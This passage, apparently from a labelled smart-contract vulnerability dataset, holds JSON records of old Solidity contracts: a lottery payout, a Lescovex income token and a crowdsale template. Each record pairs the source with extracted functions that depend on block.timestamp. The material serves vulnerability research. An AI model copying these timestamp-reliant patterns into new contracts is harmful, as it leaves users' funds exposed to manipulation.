nn++){\nuint count = 0;\nfor(uint p = 0; p < 9; p++){\nif(RandomResult[p] == nn)\ncount ++;\n}\nif(count >= 3 && nn == 0)\ngame_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.1 ether));\nif(count >= 3 && nn == 1)\ngame_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.08 ether));\nif(count >= 3 && nn == 2)\ngame_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.06 ether));\nif(count >= 3 && nn == 3)\ngame_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.04 ether));\nif(count >= 3 && nn == 4)\ngame_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.02 ether));\nif(count >= 3 && nn == 5)\ngame_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.01 ether));\n}\nif(game_result != 0){\nTicketPool[secretKey_D_hash].Result = game_result;\nif (address(this).balance >= game_result && TicketPool[secretKey_D_hash].Buyer.send(game_result)) {\nTicketPool[secretKey_D_hash].isPay = true;\nPay(secretKey_D_hash,TicketPool[secretKey_D_hash].Buyer, game_result);\n} else {\nOwe(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, game_result);\nTicketPool[secretKey_D_hash].isPay = false;\n}\n} else {\nTicketPool[secretKey_D_hash].isPay = true;\n}\nResult(secretKey_D_hash, secretKey_D, TicketPool[secretKey_D_hash].Buyer, RandomResult, game_result, block.timestamp);\nTicketPool[secretKey_D_hash].isPlay = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1eca"
  },
  "filename": "10736.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract LescovexERC20 is Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) public balances;\n mapping (address => mapping (address => uint256)) internal allowed;\n mapping (address => timeHold) holded;\n struct timeHold{\n uint256[] amount;\n uint256[] time;\n uint256 length;\n }\n string public constant standard = \"ERC20 Lescovex ISC Income Smart Contract\";\n uint8 public constant decimals = 8;\n uint256 public holdMax = 100;\n uint256 public totalSupply;\n uint256 public holdTime;\n string public name;\n string public symbol;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n function holdedOf(address _owner) public view returns (uint256) {\n uint256 requiredTime = block.timestamp - holdTime;\n uint256 iValid = 0;\n uint256 iNotValid = holded[_owner].length;\n if (iNotValid == 0\n || holded[_owner].time[iValid] >= requiredTime) {\n return 0;\n }\n uint256 i = iNotValid / 2;\n while (i > iValid) {\n if (holded[_owner].time[i] < requiredTime) {\n iValid = i;\n } else {\n iNotValid = i;\n }\n i = (iNotValid + iValid) / 2;\n }\n return holded[_owner].amount[iValid];\n }\n function hold(address _to, uint256 _value) internal {\n assert(holded[_to].length < holdMax);\n uint256 len = holded[_to].length;\n uint256 accumulatedValue = (len == 0 ) ?\n _value :\n _value + holded[_to].amount[len - 1];\n holded[_to].amount.push(accumulatedValue);\n holded[_to].time.push(block.timestamp);\n holded[_to].length++;\n }\n function setHoldTime(uint256 _value) external onlyOwner{\n holdTime = _value;\n }\n function setHoldMax(uint256 _value) external onlyOwner{\n holdMax = _value;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n delete holded[msg.sender];\n hold(msg.sender,balances[msg.sender]);\n hold(_to,_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n delete holded[_from];\n hold(_from,balances[_from]);\n hold(_to,_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n}\ninterface tokenRecipient {\n function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external ;\n}\ncontract Lescovex_ISC is LescovexERC20 {\n uint256 public contractBalance = 0;\n event LogDeposit(address sender, uint amount);\n event LogWithdrawal(address receiver, uint amount);\n address contractAddr = this;\n constructor (\n uint256 initialSupply,\n string contractName,\n string tokenSymbol,\n uint256 contractHoldTime,\n address contractOwner\n ) public {\n totalSupply = initialSupply;\n name = contractName;\n symbol = tokenSymbol;\n holdTime = contractHoldTime;\n balances[contractOwner] = totalSupply;\n }\n function deposit() external payable onlyOwner returns(bool success) {\n contractBalance = contractAddr.balance;\n emit LogDeposit(msg.sender, msg.value);\n return true;\n }\n function withdrawReward() external {\n uint256 ethAmount = (holdedOf(msg.sender) * contractBalance) / totalSupply;\n require(ethAmount > 0);\n emit LogWithdrawal(msg.sender, ethAmount);\n delete holded[msg.sender];\n hold(msg.sender,balances[msg.sender]);\n msg.sender.transfer(ethAmount);\n }\n function withdraw(uint256 value) external onlyOwner {\n msg.sender.transfer(value);\n emit LogWithdrawal(msg.sender, value);\n }\n}",
  "extract_feature": [
    "function holdedOf(address _owner) public view returns (uint256) {\nuint256 requiredTime = block.timestamp - holdTime;\nuint256 iValid = 0;\nuint256 iNotValid = holded[_owner].length;\nif (iNotValid == 0\n|| holded[_owner].time[iValid] >= requiredTime) {\nreturn 0;\n}\nuint256 i = iNotValid / 2;\nwhile (i > iValid) {\nif (holded[_owner].time[i] < requiredTime) {\niValid = i;\n} else {\niNotValid = i;\n}\ni = (iNotValid + iValid) / 2;\n}\nreturn holded[_owner].amount[iValid];\n}",
    "function hold(address _to, uint256 _value) internal {\nassert(holded[_to].length < holdMax);\nuint256 len = holded[_to].length;\nuint256 accumulatedValue = (len == 0 ) ?\n_value :\n_value + holded[_to].amount[len - 1];\nholded[_to].amount.push(accumulatedValue);\nholded[_to].time.push(block.timestamp);\nholded[_to].length++;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ecb"
  },
  "filename": "10755.sol",
  "content": "pragma solidity ^0.4.20;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n MintableToken public token;\n uint256 public startTime;\n uint256 public endTime;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_rate > 0);\n require(_wallet != address(0));\n token = createTokenContract();\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = _wallet;\n }\n function createTokenContract() internal returns (MintableToken) {\n return new MintableToken();\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n function validPurchase() internal view returns (bool) {\n bool withinPeriod = now >= startTime && now <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return withinPeriod && nonZeroPurchase;\n }\n function hasEnded() public view returns (bool) {\n return now > endTime;\n }\n}\ncontract FinalizableCrowdsale is Crowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasEnded());\n finalization();\n Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n function RefundVault(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n Closed();\n wallet.transfer(this.balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n Refunded(investor, depositedValue);\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Mint(_to, _amount);\n Freezed(_to, _until, _amount);\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"Word of mouth pro\";\n string constant TOKEN_SYMBOL = \"wmp\";\n bool constant PAUSED = true;\n address constant TARGET_USER = 0x63DA42f4151F88c7EAAeBb67783D855b4ac8AdD7;\n uint constant START_TIME = 1531087260;\n bool constant CONTINUE_MINTING = false;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n function CappedCrowdsale(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function validPurchase() internal view returns (bool) {\n bool withinCap = weiRaised.add(msg.value) <= cap;\n return super.validPurchase() && withinCap;\n }\n function hasEnded() public view returns (bool) {\n bool capReached = weiRaised >= cap;\n return super.hasEnded() || capReached;\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n function RefundableCrowdsale(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n}\ncontract MainCrowdsale is Consts, FinalizableCrowdsale {\n function hasStarted() public constant returns (bool) {\n return now >= startTime;\n }\n function finalization() internal {\n super.finalization();\n if (PAUSED) {\n MainToken(token).unpause();\n }\n if (!CONTINUE_MINTING) {\n token.finishMinting();\n }\n token.transferOwnership(TARGET_USER);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate).div(1 ether);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n}\ncontract Checkable {\n address private serviceAccount;\n bool private triggered = false;\n event Triggered(uint balance);\n event Checked(bool isAccident);\n function Checkable() public {\n serviceAccount = msg.sender;\n }\n function changeServiceAccount(address _account) onlyService public {\n assert(_account != 0);\n serviceAccount = _account;\n }\n function isServiceAccount() view public returns (bool) {\n return msg.sender == serviceAccount;\n }\n function check() onlyService notTriggered payable public {\n if (internalCheck()) {\n Triggered(this.balance);\n triggered = true;\n internalAction();\n }\n }\n function internalCheck() internal returns (bool);\n function internalAction() internal;\n modifier onlyService {\n require(msg.sender == serviceAccount);\n _;\n }\n modifier notTriggered() {\n require(!triggered);\n _;\n }\n}\ncontract BonusableCrowdsale is Consts, Crowdsale {\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 bonusRate = getBonusRate(weiAmount);\n uint256 tokens = weiAmount.mul(bonusRate).div(1 ether);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function getBonusRate(uint256 weiAmount) internal view returns (uint256) {\n uint256 bonusRate = rate;\n uint[4] memory weiRaisedStartsBoundaries = [uint(0),uint(0),uint(0),uint(0)];\n uint[4] memory weiRaisedEndsBoundaries = [uint(20000000000000000000000),uint(20000000000000000000000),uint(20000000000000000000000),uint(20000000000000000000000)];\n uint64[4] memory timeStartsBoundaries = [uint64(1531087260),uint64(1532383140),uint64(1534197540),uint64(1536011940)];\n uint64[4] memory timeEndsBoundaries = [uint64(1532383140),uint64(1534197540),uint64(1536011940),uint64(1537221540)];\n uint[4] memory weiRaisedAndTimeRates = [uint(400),uint(300),uint(200),uint(100)];\n for (uint i = 0; i < 4; i++) {\n bool weiRaisedInBound = (weiRaisedStartsBoundaries[i] <= weiRaised) && (weiRaised < weiRaisedEndsBoundaries[i]);\n bool timeInBound = (timeStartsBoundaries[i] <= now) && (now < timeEndsBoundaries[i]);\n if (weiRaisedInBound && timeInBound) {\n bonusRate += bonusRate * weiRaisedAndTimeRates[i] / 1000;\n }\n }\n uint[2] memory weiAmountBoundaries = [uint(20000000000000000000),uint(10000000000000000000)];\n uint[2] memory weiAmountRates = [uint(0),uint(50)];\n for (uint j = 0; j < 2; j++) {\n if (weiAmount >= weiAmountBoundaries[j]) {\n bonusRate += bonusRate * weiAmountRates[j] / 1000;\n break;\n }\n }\n return bonusRate;\n }\n}\ncontract TemplateCrowdsale is Consts, MainCrowdsale\n , BonusableCrowdsale\n , RefundableCrowdsale\n , CappedCrowdsale\n{\n event Initialized();\n bool public initialized = false;\n function TemplateCrowdsale(MintableToken _token) public\n Crowdsale(START_TIME > now ? START_TIME : now, 1546297140, 1500 * TOKEN_DECIMAL_MULTIPLIER, 0x8F988d90C96282402b47b01D7EADE079eA6eBe36)\n CappedCrowdsale(20000000000000000000000)\n RefundableCrowdsale(1000000000000000000000)\n {\n token = _token;\n }\n function init() public onlyOwner {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n MainToken(token).pause();\n }\n address[4] memory addresses = [address(0x192ff136cd853ab6b9b5097bf017024d7da709c3),address(0xa00be5796cf65147a7494f2f27de08cca6847cbb),address(0xb1c1113f071fa97318074486e27efd8e753f6b54),address(0xbd3e941f88c892118a8fc50ffa8ccd1199e30704)];\n uint[4] memory amounts = [uint(1500000000000000000000000),uint(5000000000000000000000000),uint(10000000000000000000000000),uint(3500000000000000000000000)];\n uint64[4] memory freezes = [uint64(1577746808),uint64(1577746809),uint64(0),uint64(1561845608)];\n for (uint i = 0; i < addresses.length; i++) {\n if (freezes[i] == 0) {\n MainToken(token).mint(addresses[i], amounts[i]);\n } else {\n MainToken(token).mintAndFreeze(addresses[i], amounts[i], freezes[i]);\n }\n }\n transferOwnership(TARGET_USER);\n Initialized();\n }\n function createTokenContract() internal returns (MintableToken) {\n return MintableToken(0);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nReleased(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ecc"
  },
  "filename": "10758.sol",
  "content": "pragma solidity ^0.4.20;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function 